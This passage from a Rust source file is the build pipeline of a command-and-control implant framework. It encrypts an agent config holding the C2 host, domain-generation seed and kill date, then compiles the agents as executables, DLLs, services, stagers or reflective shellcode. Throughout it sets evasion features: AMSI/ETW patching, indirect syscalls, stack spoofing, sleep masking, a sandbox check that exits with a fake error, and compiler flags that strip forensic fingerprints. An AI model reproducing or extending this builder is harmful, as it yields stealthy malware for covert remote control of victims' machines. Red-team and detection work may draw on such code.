        println!("[*] Using Built-in Profile: {:?}", cli.profile);
        construct_builtin_profile(&cli.profile)
    };

    println!("[*] Profile Name: {}", final_profile.name);

    let kill_ts = if cli.days > 0 {
        Utc::now().checked_add_signed(Duration::days(cli.days))
            .map(|dt| dt.timestamp())
    } else { None };

    let build_id = Uuid::new_v4().to_string();
    let hash_salt = Uuid::new_v4().to_string();
    println!("[*] Build ID:     {}", build_id);

    // Log auto-cascade pivot port if configured
    if let Some(port) = cli.auto_pivot_port {
        println!("[*] Auto-pivot:   :{} (cascade listener starts on session connect)", port);
    }

    // ── Validation gates (before any key material is minted) ──────────
    // Rejected combinations must bail HERE: the crypto setup below writes
    // dist/server_keys_<id>.json and a build_keys DB row, and a rejected
    // build must not leave orphan key material behind.
    // Bind each PossibleValue first: get_name() borrows from it, so a
    // one-liner chain would drop the temporary while the &str is live.
    let format_pv = cli.format.to_possible_value().unwrap();
    let format_tag = format_pv.get_name();
    let platform_pv = cli.platform.to_possible_value().unwrap();
    let platform_tag = platform_pv.get_name();
    let transport_pv = cli.transport.to_possible_value().unwrap();
    let transport_tag_name = transport_pv.get_name();
    rcm::build_validate::check_hibernation_transport(cli.hibernation, transport_tag_name)
        .map_err(anyhow::Error::msg)?;
    // Shellcode/donut/pe_to_shellcode/bin wrap Windows x64 artifacts and
    // dll/service have no ELF/Mach-O equivalent - reject non-windows
    // platforms up front instead of after a 10-minute compile.
    rcm::build_validate::check_format_platform(format_tag, platform_tag)
        .map_err(anyhow::Error::msg)?;

    // The stager downloads its payload over HTTPS (raw-TCP HTTP fallback)
    // from the same listener port; it cannot speak the raw-TLS or
    // named-pipe transports.
    if cli.format == Format::Stager && !matches!(cli.transport, Transport::Http | Transport::Https) {
        anyhow::bail!(
            "--format stager requires --transport http or https: the stager speaks \
             HTTPS (raw HTTP fallback) to /stage/<build_id> and cannot use the {} listener",
            transport_tag_name
        );
    }

    // Parent-check list and egress-proxy flags are baked into the config
    // below; reject malformed values before any build work happens.
    let valid_parents = parse_valid_parents(&cli.valid_parents).map_err(anyhow::Error::msg)?;
    check_proxy_flags(&cli.proxy_url, &cli.proxy_user, &cli.proxy_pass).map_err(anyhow::Error::msg)?;

    // ── format bin: parse the pipeline up front ───────────────────────
    // The first stage selects the source artifact (pe|exe|dll -> build the
    // matching Rust agent bin; pic -> compile the PIC C template with no
    // Rust build at all, handled by an early return below).
    let pipeline_stages: Option<Vec<String>> = if cli.format == Format::Bin {
        let spec = cli.pipeline.clone()
            .unwrap_or_else(|| rcm::pipeline::default_pipeline().to_string());
        let stages = rcm::pipeline::parse_pipeline(&spec)
            .map_err(|e| anyhow::anyhow!("--pipeline: {e}"))?;
        rcm::pipeline::validate_pipeline_order(&stages)
            .map_err(|e| anyhow::anyhow!("--pipeline: {e}"))?;
        if stages[0] == "pic" {
            let short_id: String = build_id.chars().take(8).collect();
            return run_pic_pipeline(&cli, &project_root, &stages, &short_id);
        }
        Some(stages)
    } else {
        None
    };

    // ── Crypto setup ──────────────────────────────────────────────────
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let verify_key = signing_key.verifying_key();
    let pub_key_b64 = BASE64.encode(verify_key.to_bytes());

    let mut challenge_key_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut challenge_key_bytes);
    let challenge_key_b64 = BASE64.encode(challenge_key_bytes);

    // ── Save server artifacts ─────────────────────────────────────────
    save_server_artifacts(&project_root, &build_id, &signing_key, &final_profile)?;

    if let Err(e) = try_update_local_db(&project_root, &build_id, &signing_key, &final_profile, &challenge_key_bytes) {
        println!("[!] Could not auto-update local DB: {}", e);
        println!("[*] Import 'dist/server_keys_{}.json' manually.", build_id);
    }

    // ── Build config ──────────────────────────────────────────────────
    let port_u16 = if cli.transport == Transport::NamedPipe {
        0
    } else {
        cli.port.parse::<u16>().context("Port must be a number for TCP/TLS")?
    };

    let final_host = if cli.transport == Transport::NamedPipe {
        format!("{}:{}", cli.host, cli.port)
    } else {
        cli.host.clone()
    };

    // Fallback profiles are parsed as the shared FallbackConfig type. The
    // file format is the field-name-free positional seq (see common.rs):
    //   [[endpoint, ...], strategy_tag, dead_time_secs]
    // with endpoint = [host, port, transport_tag, profile, proxy, priority,
    // weight, max_failures] (trailing elements optional).
    let fallback_cfg: rcm::common::FallbackConfig = if let Some(path) = &cli.fallback_file {
        println!("[*] Loading Fallback: {}", path);
        let content = fs::read_to_string(path).context("Failed to read fallback file")?;
        let parsed: rcm::common::FallbackConfig =
            serde_json::from_str(&content).context("Invalid fallback JSON (expected positional array format)")?;
        println!("[*] Fallback:     {} endpoints, strategy={:?}", parsed.endpoints.len(), parsed.strategy);
        parsed
    } else {
        rcm::common::FallbackConfig {
            endpoints: vec![],
            strategy: rcm::common::FallbackStrategy::Priority,
            dead_time_secs: 300,
        }
    };

    // Assemble the config as a POSITIONAL JSON array matching C2Config's
    // declaration order (transport=0, profile=1, ..., auto_pivot_port=32).
    // serde_json::from_value then drives the manual seq Deserialize impl,
    // and the result is packed into the binary blob that gets encrypted.
    let profile_value = serde_json::to_value(&final_profile)?;
    let fallback_value = serde_json::to_value(&fallback_cfg)?;
    // ProxyConfig positional: [use_system, url, username, password]. An
    // explicit --proxy-url switches the agent off the host's system proxy
    // settings; credentials ride along only with a URL (gated above).
    let proxy_value = if cli.proxy_url.is_some() {
        json!([false,
               cli.proxy_url.as_deref().unwrap_or(""),
               cli.proxy_user.as_deref().unwrap_or(""),
               cli.proxy_pass.as_deref().unwrap_or("")])
    } else {
        json!([true, "", "", ""])
    };
    let dga_value = cli.dga_seed.map(|seed| json!([
        seed,
        cli.dga_window,
        cli.dga_count,
        cli.dga_tlds.split(',').collect::<Vec<_>>()
    ]));

    // Transport tag (Tls=0, TcpPlain=1, NamedPipe=2, Http=3, Https=4)
    let transport_tag: u8 = match cli.transport {
        Transport::Tls       => 0,
        Transport::TcpPlain  => 1,
        Transport::NamedPipe => 2,
        Transport::Http      => 3,
        Transport::Https     => 4,
    };

    let config_value = json!([
        transport_tag,          // 0: transport
        profile_value,          // 1: profile
        proxy_value,            // 2: proxy (use_system, url, username, password)
        fallback_value,         // 3: fallback
        pub_key_b64,            // 4: server_public_key
        hash_salt,              // 5: hash_salt
        final_host,             // 6: c2_host
        build_id,               // 7: build_id
        port_u16,               // 8: tunnel_port
        cli.sleep,              // 9: sleep_interval
        cli.jitter_min,         // 10: jitter_min
        cli.jitter_max,         // 11: jitter_max
        cli.bloat,              // 12: bloat_mb
        cli.debug,              // 13: debug
        kill_ts,                // 14: kill_date
        challenge_key_b64,      // 15: challenge_key
        cli.sni_override,       // 16: sni_override
        cli.alpn_protocols,     // 17: alpn_protocols
        cli.hibernation,        // 18: hibernation_mode
        cli.batch_size,         // 19: task_batch_size
        dga_value,              // 20: dga
        valid_parents,          // 21: valid_parents (from --valid-parents; empty = parent check off)
        // ── Evasion ───────────────────────────────────────────────────
        cli.sleep_mask,         // 22: sleep_mask
        cli.indirect_syscalls,  // 23
        cli.stack_spoof,        // 24
        cli.patch_amsi_etw,     // 25
        cli.heap_encrypt,       // 26
        // ── Execution guardrails ──────────────────────────────────────
        cli.guard_domain,       // 27
        cli.guard_hostname,     // 28
        guard_hour_start,       // 29
        guard_hour_end,         // 30
        cli.guard_no_system,    // 31
        // ── Pivot auto-cascade (null when not set) ────────────────────
        cli.auto_pivot_port,    // 32
    ]);

    let config: rcm::common::C2Config = serde_json::from_value(config_value)
        .context("Internal error: assembled config does not fit the C2Config schema")?;

    println!("[*] Encrypting configuration...");
    let key = Aes256Gcm::generate_key(&mut CryptoOsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut CryptoOsRng);
    let config_packed = config.pack();
    let ciphertext = cipher.encrypt(&nonce, config_packed.as_slice())
        .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;

    let build_env_json = json!({
        "encrypted": true,
        "key_hex": hex::encode(key),
        "nonce_hex": hex::encode(nonce),
        "cipher_hex": hex::encode(ciphertext),
        "bloat_mb": cli.bloat
    }).to_string();

    // ── Compile ───────────────────────────────────────────────────────
    let (target, ext) = match cli.platform {
        Platform::Linux     => ("x86_64-unknown-linux-gnu", ""),
        Platform::LinuxMusl => ("x86_64-unknown-linux-musl", ""),
        Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
        Platform::Macos   => {
            println!("\n[!] WARNING: macOS cross-compilation is not supported in the Docker image.");
            println!("[!] osxcross is required and is not installed.");
            println!("[!] Build macOS agents natively on a macOS host instead.\n");
            ("x86_64-apple-darwin", "")
        }
    };

    // Verify the target is installed before wasting time on compilation.
    //
    // The original code called `cargo target list --installed`, but
    // "cargo target" is not a valid cargo subcommand. cargo exits with an
    // error, the output is empty, `installed` is always false, and the
    // bail fires even when the target IS installed.
    //
    // The correct tool is `rustup target list --installed`. rustup lives
    // in $CARGO_HOME/bin/ alongside cargo, so find_rustup() mirrors the
    // same resolution logic as find_cargo().
    if cli.platform == Platform::Windows {
        let rustup_bin = find_rustup();
        let target_check = Command::new(&rustup_bin)
            .args(["target", "list", "--installed"])
            .output();

        let installed = target_check
            .map(|o| String::from_utf8_lossy(&o.stdout).contains(target))
            .unwrap_or(false);

        if !installed {
            anyhow::bail!(
                "Rust target '{}' is not installed.\n\
                 Run: rustup target add {}",
                target, target
            );
        }
    }

    let (bin_name, output_ext) = match cli.format {
        Format::Exe | Format::PeToShellcode => ("client", ext),
        Format::Dll | Format::Shellcode | Format::Donut => ("client_dll", ".dll"),
        Format::Service              => ("client_service", ext),
        Format::Stager               => ("stager", ext),
        Format::PicC                 => unreachable!("pic_c returns before the Rust build"),
        Format::Bin => match pipeline_stages.as_ref().and_then(|s| s.first()).map(String::as_str) {
            Some("dll") => ("client_dll", ".dll"),
            // pe / exe source (validate_pipeline_order guarantees a source
            // stage is first; pic-sourced pipelines returned earlier).
            _ => ("client", ext),
        },
    };

    let format_name = cli.format.to_possible_value().unwrap().get_name().to_string();
    println!("[*] Format:       {}", format_name);
    println!("[*] Compiling {} for {}...", bin_name, target);

    // Use --target-dir pointing to the cached target/ directory so
    // incremental compilation works across builds.
    let target_dir = project_root.join("target");

    // Pass CARGO_HOME and RUSTUP_HOME explicitly in case the subprocess
    // doesn't inherit them from the environment (can happen when spawned
    // from within the server binary under certain init systems).
    // The cargo Command for the agent compile is assembled by
    // agent_compile_command() AFTER the toolchain probe and RUSTFLAGS
    // composition below, so the primary compile and the stager's
    // staged-payload compile share one construction and cannot diverge.

    // Note: --allow-vm is baked in by agent_compile_command (RCM_AGENT_ALLOW_VM).
    if cli.allow_vm {
        println!("[!] --allow-vm: VM/sandbox environment check disabled in this build.");
    } else {
        println!("[i] VM check armed: this agent decoy-exits on KVM/QEMU/VMware targets");
        println!("    (prints a fake libssl.so.1.1 error, then exits). Use --allow-vm for lab/VM targets.");
    }
    // glibc floor warning: gnu-linked linux agents require the build image's
    // glibc at runtime (currently trixie, >= 2.38). Older targets need the
    // static musl build instead.
    if matches!(cli.platform, Platform::Linux) {
        println!("[i] Portability: linux (gnu) builds need glibc >= 2.38 on the target.");
        println!("    For older/mixed targets use --platform linux-musl (fully static).");
    }

    // OPSEC: in shipped (non-debug) agents, compile out ALL tracing callsite
    // metadata: every tracing event macro (ours and dependencies', e.g. h2)
    // expands to a no-op with no static file:line strings in the binary.
    // Debug builds keep full logging (callsites + subscriber).
    if !cli.debug {
        println!("[+] OPSEC: tracing callsites suppressed (agent-quiet / release_max_level_off)");
    }

    // ── OPSEC RUSTFLAGS: panic-location stripping ─────────────────────
    //
    // Rust panic metadata embeds `file:line:col` for every panic site.
    // On nightly, `-Zlocation-detail=none` removes line/column info and
    // `-Ztrim-paths` rewrites all path prefixes (own crate -> `<crate>/`,
    // registry -> neutral form, sysroot removed), superseding the manual
    // --remap-path-prefix flags. On stable those flags are rejected, so
    // fall back to the path remaps and warn loudly that file:line strings
    // WILL leak into the binary.
    let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| "/usr/local/cargo".to_string());

    // Toolchain channel: taken from the project's rust-toolchain.toml so a
    // dated pin (e.g. "nightly-2026-08-22", which is the ONLY form installed
    // in the dated Docker images) is probed/installed/pinned by its exact
    // name instead of the floating "nightly".
    let toolchain_channel = resolve_toolchain_channel(&project_root);

    // Toolchain detection: probe via `rustup run <channel> rustc --version`,
    // which BYPASSES RUSTUP_TOOLCHAIN and rust-toolchain.toml resolution
    // entirely. The bare cargo/rustc shims resolve whatever toolchain the
    // environment pins - official rust:* images set ENV RUSTUP_TOOLCHAIN=<stable>
    // (priority 2), which silently outranks the project's rust-toolchain.toml
    // (priority 3) - so a shim-based probe would report stable even when
    // nightly is installed. `rustup run <channel>` selects the toolchain
    // explicitly (priority 1 equivalent) and is environment-independent.
    let rustup_bin = find_rustup();
    let nightly_version = Command::new(&rustup_bin)
        .args(["run", toolchain_channel.as_str(), "rustc", "--version"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();
    // Dated channels still print "nightly" in rustc --version output.
    let mut is_nightly = nightly_version.contains("nightly");

    // Shim resolution (what `cargo`/`rustc` would actually run under this
    // environment) is probed ONLY for the stable-toolchain warning message
    // below - never for the is_nightly decision.
    let rustc_bin = cargo_bin.with_file_name("rustc");
    let rustc_version = Command::new(&rustc_bin)
        .arg("--version")
        .output()
        .or_else(|_| Command::new("rustc").arg("--version").output())
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();

    // Self-provision: when the pinned channel is missing, try to install it
    // via rustup instead of failing outright. This path mainly helps
    // non-Docker users - the Dockerfile pre-installs the pinned channel +
    // rust-src at image level - and it only fails if the install itself
    // fails (e.g. offline build). The re-probe goes through
    // `rustup run <channel>` again, NOT the bare rustc shim: the shim still
    // answers stable while RUSTUP_TOOLCHAIN=<stable> is set (the old
    // re-check re-ran the shim in the same environment and so concluded
    // "stable" even after a successful install).
    if !is_nightly {
        println!("[*] Stable toolchain detected - attempting auto-install of {} via rustup...", toolchain_channel);
        let tc_ok = Command::new(&rustup_bin)
            .args(["toolchain", "install", toolchain_channel.as_str(), "--profile", "minimal"])
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if tc_ok {
            let _ = Command::new(&rustup_bin)
                .args(["component", "add", "rust-src", "--toolchain", toolchain_channel.as_str()])
                .status();
            let v2 = Command::new(&rustup_bin)
                .args(["run", toolchain_channel.as_str(), "rustc", "--version"])
                .output()
                .ok()
                .filter(|o| o.status.success())
                .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
                .unwrap_or_default();
            is_nightly = v2.contains("nightly");
            if is_nightly {
                println!("[+] Toolchain {} auto-installed successfully.", toolchain_channel);
            }
        }
        if !is_nightly {
            println!("[!] Toolchain auto-install failed (offline? no rustup?).");
        }
    }

    // The cargo -Z flags are collected here and applied by
    // agent_compile_command() for BOTH the primary agent compile and the
    // stager's staged-payload compile - identical OPSEC flags on both.
    let mut z_args: Vec<String> = Vec::new();
    if is_nightly {
        // -Ztrim-paths is a cargo option (not rustc): rewrites own-crate paths
        // to <crate>/..., registry and sysroot paths to neutral forms. Always
        // safe on nightly, independent of rust-src.
        z_args.push("-Ztrim-paths".into());
        // Rebuild the standard library from source with the SAME OPSEC flags.
        //
        // Without this, the *prebuilt* core/std still fingerprint the binary
        // as Rust:
        //   - `/rustc/<commit>/library/{core,std,alloc}/...` panic-location
        //     paths (location-detail only applies to crates compiled with it,
        //     and the shipped std was compiled WITHOUT it),
        //   - std panic message strings: "called `Option::unwrap()` on a
        //     `None` value", "thread '<name>' panicked at", index/OOB texts,
        //   - the `RUST_BACKTRACE` env-var name from std's backtrace support.
        //
        // -Zbuild-std recompiles std for the agent target so
        // -Zlocation-detail=none and -Ztrim-paths cover it too;
        // panic_immediate_abort turns every std panic into an immediate abort
        // with NO message formatting machinery, so those strings are never
        // materialized in the binary. Requires the rust-src component.
        // Query the pinned toolchain explicitly: a bare
        // `component list --installed` inspects the env-resolved (stable)
        // toolchain under RUSTUP_TOOLCHAIN=<stable> and would miss the
        // rust-src component installed for the pinned channel above.
        let rust_src_ok = Command::new(&rustup_bin)
            .args(["component", "list", "--toolchain", toolchain_channel.as_str(), "--installed"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).contains("rust-src"))
            .unwrap_or(false);
        if rust_src_ok {
            println!("[+] OPSEC: rebuilding std with panic_immediate_abort (Rust fingerprints removed)");
            // NOTE: -Zbuild-std is a CARGO option (must be a cargo arg, NOT
            // in RUSTFLAGS - rustc rejects it). panic_immediate_abort is
            // enabled as a panic STRATEGY via -Cpanic=immediate-abort (in
            // RUSTFLAGS below); the old std-feature form was removed from
            // newer nightlies.
            z_args.push("-Zbuild-std=std,panic_abort".into());
        } else {
            println!("[!] ============================================================");
            println!("[!] WARNING: rust-src component not installed.");
            println!("[!] The prebuilt std will leak Rust fingerprints:");
            println!("[!]   /rustc/<hash>/library/... paths, unwrap/panic messages,");
            println!("[!]   RUST_BACKTRACE. Install it: rustup component add rust-src");
            println!("[!] ============================================================");
        }
    }

    let opsec_flags = if is_nightly {
        println!("[+] OPSEC: panic locations stripped (nightly)");
        // -Zunstable-options unlocks -Cpanic=immediate-abort: every panic
        // (including inside std, which -Zbuild-std recompiles) becomes an
        // immediate abort with NO message formatting machinery - std panic
        // strings (called `Option::unwrap()`..., thread '...' panicked at,
        // RUST_BACKTRACE) are never materialized in the binary.
        "-Zlocation-detail=none -Zunstable-options -Cpanic=immediate-abort".to_string()
    } else {
        println!("[!] ============================================================");
        println!("[!] WARNING: stable toolchain detected ('{}').", rustc_version.trim());
        println!("[!] Panic file:line strings WILL leak into the agent binary.");
        println!("[!] Use a nightly toolchain for -Zlocation-detail=none -Ztrim-paths.");
        println!("[!] ============================================================");
        if !cli.allow_stable_leak {
            eprintln!("[-] REFUSING to build a leaky agent on a stable toolchain.");
            eprintln!("[-] Install the pinned toolchain + rust-src:");
            eprintln!("[-]   rustup toolchain install {} --profile minimal", toolchain_channel);
            eprintln!("[-]   rustup component add rust-src --toolchain {}", toolchain_channel);
            eprintln!("[-] (in Docker: add both lines to the image AND unset RUSTUP_TOOLCHAIN)");
            eprintln!("[-] Or pass --allow-stable-leak for a throwaway dev build.");
            anyhow::bail!("stable toolchain would produce a fingerprinted binary");
        }
        println!("[!] --allow-stable-leak set: proceeding with a KNOWN-LEAKY build.");
        format!(
            "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
            project_root.display(), cargo_home
        )
    };

    // ── Windows PE resources: icon + VERSIONINFO ──────────────────────
    // (windres -> COFF object -> linker). Prepared here so the resource.o
    // path can be appended to RUSTFLAGS below.
    // Missing windres / non-Windows target / non-exe format: warn + continue.
    let mut icon_build: Option<(PathBuf, PathBuf)> = None;
    if cli.icon.is_some() || cli.icon_preset.is_some() || has_pe_info(&cli) {
        match prepare_windows_resources(&cli, &project_root) {
            Ok(v)   => icon_build = v,
            Err(e)  => println!("[!] PE resource step failed: {:#} - continuing without icon/VERSIONINFO", e),
        }
    }

    // Cargo uses exactly one rustflags source: the env RUSTFLAGS set here
    // SHADOWS the `[target.x86_64-pc-windows-gnu] rustflags` static-link flags
    // in .cargo/config.toml. Re-include them for the MinGW target or the agent
    // ends up depending on mingw runtime DLLs on the target host.
    let mut target_flags = if target == "x86_64-pc-windows-gnu" {
        // RUSTFLAGS is whitespace-split by cargo, so each flag must be a
        // single token: -C link-arg=<x> (singular) - NOT
        // `-C link-args=-static -static-libgcc ...`, whose space-separated
        // tail would be misparsed as rustc options ("Unrecognized option: 's'").
        " -C link-arg=-static -C link-arg=-static-libgcc -C link-arg=-static-libstdc++".to_string()
    } else {
        String::new()
    };
    if let Some((obj, _dir)) = &icon_build {
        // Link the windres-produced COFF object (icon + VERSIONINFO resources).
        target_flags.push_str(&format!(" -C link-arg={}", obj.display()));
    }
    // client_dll needs no manual DLL linker flags here: it is a cdylib
    // crate (client_dll/ workspace member), so cargo/rustc link it as a real PE
    // DLL with the CRT's DllMainCRTStartup entry point and a DllMain
    // export. verify_client_dll below proves both before shipping.

    // Every build through this path is an AGENT binary (client, client_dll,
    // client_service, stager) - the server and builder itself are compiled
    // separately without these flags. --cfg agent_build compiles the typed
    // config tree (src/config.rs) down to struct definitions + embedded
    // defaults: no TOML parser, no derived serde Deserialize impls, and none
    // of the ~82 field-name strings leak into the agent binary. The
    // --check-cfg registers the custom cfg so the unexpected_cfgs lint stays
    // quiet (mirrored in Cargo.toml [lints.rust] for plain `cargo check`).
    let agent_cfg_flags = " --cfg agent_build --check-cfg=cfg(agent_build)";

    // Preserve operator-provided RUSTFLAGS by appending, not overwriting.
    let rustflags = match std::env::var("RUSTFLAGS") {
        Ok(existing) if !existing.trim().is_empty() => {
            format!("{} {}{}{}", existing, opsec_flags, target_flags, agent_cfg_flags)
        }
        _ => format!("{}{}{}", opsec_flags, target_flags, agent_cfg_flags),
    };

    let mut cmd = agent_compile_command(
        &cargo_bin, &project_root, target, &target_dir,
        &build_env_json, &rustflags, &z_args, bin_name, &cli,
        is_nightly, &toolchain_channel,
    );

    println!("[*] cargo invocation: {:?} {:?}", cmd.get_program(), cmd.get_args());
    let status = cmd.status().context(
        "Failed to spawn cargo. Verify that cargo is installed and accessible."
    )?;

    if !status.success() {
        anyhow::bail!(
            "cargo build failed (exit {:?}).\n\
             Check the log above for compiler errors.",
            status.code()
        );
    }

    // ── Verify / copy artifact to dist/ ───────────────────────────────
    // cargo emits Windows [[bin]] artifacts as "<name>.exe", except
    // client_dll: as a cdylib target it comes out of the linker as a real
    // "<name>.dll" already.
    let cargo_file = if target.contains("windows") && bin_name != "client_dll" {
        format!("{}.exe", bin_name)
    } else if target.contains("windows") {
        format!("{}.dll", bin_name)
    } else {
        bin_name.to_string()
    };
    let src_path = target_dir
        .join(target)
        .join("release")
        .join(&cargo_file);

    // Prove the cdylib really is a PE DLL exporting DllMain before any
    // downstream path (copy / sRDI / donut / pipeline) consumes it:
    // reflective loaders reach DllMain via the PE entry point, rundll32
    // calls the DllMain export by name - both need a genuine DLL.
    if bin_name == "client_dll" && target.contains("windows") {
        verify_client_dll(&src_path)?;
    }

    // Artifacts live in <project_root>/dist regardless of the builder's
    // CWD - the same root resolution cargo uses, so non-Docker/manual runs
    // from another directory do not scatter artifacts into a stray dist/.
    let dist_dir = project_root.join("dist");
    fs::create_dir_all(&dist_dir)?;

    let short_id: String = build_id.chars().take(8).collect();

    // Artifact filename base: --name (sanitized) overrides the default
    // "<format>_<platform>_<id>" base; the extension stays format-derived.
    let platform_pv  = cli.platform.to_possible_value().unwrap();
    let platform_tag = platform_pv.get_name();
    let name_base = cli.name.as_deref()
        .and_then(|n| {
            let s = sanitize_artifact_name(n);
            if s.is_none() && !n.is_empty() {
                println!("[!] --name '{}' has no usable [A-Za-z0-9._-] chars; using default name.", n);
            }
            s
        })
        .unwrap_or_else(|| match cli.format {
            // Format-specific default artifact names (see docs/builder.md):
            //   donut -> dist/donut_<id>.bin, bin -> dist/agent_pipeline_<id>.bin
            Format::Donut => format!("donut_{}", short_id),
            Format::Bin   => format!("agent_pipeline_{}", short_id),
            _ => format!("{}_{}_{}", format_name, platform_tag, short_id),
        });

    if cli.format == Format::Shellcode {
        // ── Convert the freshly built DLL to reflective shellcode ─────
        if !src_path.exists() {
            anyhow::bail!(
                "Artifact not found at {}.\n\
                 The build appeared to succeed but the output DLL is missing.",
                src_path.display()
            );
        }
        let dll_bytes = fs::read(&src_path).context("Failed to read built DLL")?;
        let opts = rcm::shellcode::ShellcodeOptions {
            function_hash: cli.sc_hash,
            user_data: cli.sc_userdata.clone().into_bytes(),
            flags: cli.sc_flags,
        };
        let sc = rcm::shellcode::convert_dll_to_shellcode(&dll_bytes, &opts)
            .map_err(|e| anyhow::anyhow!("Shellcode conversion failed: {e}"))?;

        let (encoding, sc_ext) = match cli.sc_output {
            ScOutput::Bin => (rcm::shellcode::ShellcodeEncoding::Raw,    ".bin"),
            ScOutput::B64 => (rcm::shellcode::ShellcodeEncoding::Base64, ".b64.txt"),
            ScOutput::C   => (rcm::shellcode::ShellcodeEncoding::CArray, ".c.txt"),
            ScOutput::Hex => (rcm::shellcode::ShellcodeEncoding::Hex,    ".hex.txt"),
        };
        let rendered = rcm::shellcode::encode_shellcode(&sc, encoding, "rcm_sc");
        let dest_path = dist_dir.join(format!("{}{}", name_base, sc_ext));
        fs::write(&dest_path, &rendered)?;

        println!("\n[+] Build Success!");
        // NOTE: the API job watcher harvests the artifact path from the
        // "[+] Binary: " prefix - keep this exact line first.
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
        println!("[+] Profile:  {}", final_profile.name);
        println!("[+] DLL:      {} bytes → shellcode: {} bytes", dll_bytes.len(), sc.len());
        println!("[i] Layout: 69-byte bootstrap + {}-byte RDI stub + DLL + user data", rcm::shellcode::RDI_STUB_LEN);
        println!("[i] Export hash: 0x{:08X} (0x10 = DllMain only), flags: {}", opts.function_hash, opts.flags);
        return Ok(());
    }

    if cli.format == Format::Donut {
        // ── Convert the freshly built DLL to shellcode with donut ─────
        if !src_path.exists() {
            anyhow::bail!(
                "Artifact not found at {}.\n\
                 The build appeared to succeed but the output DLL is missing.",
                src_path.display()
            );
        }
        let donut = find_donut(&project_root).ok_or_else(|| anyhow::anyhow!(
            "donut generator not found. Set DONUT_PATH, install it at \
             /opt/rcm/donut (baked into the Docker image), or place it at \
             tools/donut/donut in the project root."
        ))?;
        println!("[*] donut:        {}", donut.display());
        let raw = run_donut(&donut, &src_path)?;
        let (encoding, sc_ext) = sc_encoding(&cli);
        let rendered = rcm::shellcode::encode_shellcode(&raw, encoding, "rcm_donut");
        let dest_path = dist_dir.join(format!("{}{}", name_base, sc_ext));
        fs::write(&dest_path, &rendered)?;

        println!("\n[+] Build Success!");
        // NOTE: the API job watcher harvests the artifact path from the
        // "[+] Binary: " prefix - keep this exact line first.
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
        println!("[+] Profile:  {}", final_profile.name);
        println!("[+] donut:    {} -> {} bytes of shellcode", src_path.display(), raw.len());
        return Ok(());
    }

    if cli.format == Format::PeToShellcode {
        // ── Convert the freshly built EXE via the OEP sRDI stub ───────
        if !src_path.exists() {
            anyhow::bail!(
                "Artifact not found at {}.\n\
                 The build appeared to succeed but the output EXE is missing.",
                src_path.display()
            );
        }
        let pe_bytes = fs::read(&src_path).context("Failed to read built EXE")?;
        let opts = rcm::shellcode::ShellcodeOptions {
            function_hash: cli.sc_hash,
            user_data: cli.sc_userdata.clone().into_bytes(),
            flags: cli.sc_flags,
        };
        let sc = rcm::shellcode::convert_pe_to_shellcode(&pe_bytes, &opts)
            .map_err(|e| anyhow::anyhow!("PE-to-shellcode conversion failed: {e}"))?;

        let (encoding, sc_ext) = sc_encoding(&cli);
        let rendered = rcm::shellcode::encode_shellcode(&sc, encoding, "rcm_sc");
        let dest_path = dist_dir.join(format!("{}{}", name_base, sc_ext));
        fs::write(&dest_path, &rendered)?;

        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
        println!("[+] Profile:  {}", final_profile.name);
        println!("[+] PE:       {} bytes -> shellcode: {} bytes", pe_bytes.len(), sc.len());
        println!("[i] Layout: 69-byte bootstrap + {}-byte OEP stub + PE + user data", rcm::shellcode::EXE_STUB_LEN);
        println!("[i] Entry: original entry point called as entry(rcx=image base, rdx=1, r8=NULL)");
        return Ok(());
    }

    if cli.format == Format::Bin {
        // ── Generic pipeline: transform the built artifact per stages ─
        let stages = pipeline_stages
            .as_ref()
            .expect("pipeline is parsed for --format bin");
        if !src_path.exists() {
            anyhow::bail!(
                "Artifact not found at {}.\n\
                 The build appeared to succeed but the output is missing.",
                src_path.display()
            );
        }
        println!("[*] Pipeline:     {}", stages.join(" -> "));
        let artifact = fs::read(&src_path).context("Failed to read built artifact")?;
        // stages[0] is the source selector (pe/exe/dll) and only decided
        // WHICH Rust bin got built; transformations start at stages[1..].
        let out = run_pipeline_stages(&cli, &project_root, artifact, true, &stages[1..])?;
        let dest_path = dist_dir.join(format!("{}.bin", name_base));
        fs::write(&dest_path, &out)?;

        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format:   {} (pipeline: {})", format_name, stages.join(","));
        println!("[+] Profile:  {}", final_profile.name);
        println!("[+] Output:   {} bytes", out.len());
        return Ok(());
    }

    let dest_path = dist_dir.join(format!("{}{}", name_base, output_ext));
    if cli.name.is_some() {
        println!("[*] Artifact name: {} (operator override)", name_base);
    }

    if src_path.exists() {
        fs::copy(&src_path, &dest_path)?;
        if let Err(e) = apply_elf_comment(&dest_path, &cli) {
            println!("[!] elf-comment step failed: {e} (artifact left without .comment)");
        }
        if let Err(e) = maybe_sign_pe(&dest_path, &cli, &project_root) {
            println!("[!] signing step failed: {e} (artifact left unsigned)");
        }
        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format: {}", format_name);
        println!("[+] Profile: {}", final_profile.name);
    } else {
        anyhow::bail!(
            "Artifact not found at {}.\n\
             The build appeared to succeed but the output binary is missing.",
            src_path.display()
        );
    }

    // Stager builds also produce the full-agent payload the stager
    // downloads at runtime: GET /stage/<build_id> on the server serves
    // dist/staged_<build_id>.payload. Built with the SAME config blob and
    // the SAME cargo invocation (flags/RUSTFLAGS/pin), so the staged agent
    // carries this build's keys and build_id and compiles identically.
    if cli.format == Format::Stager {
        build_staged_agent(
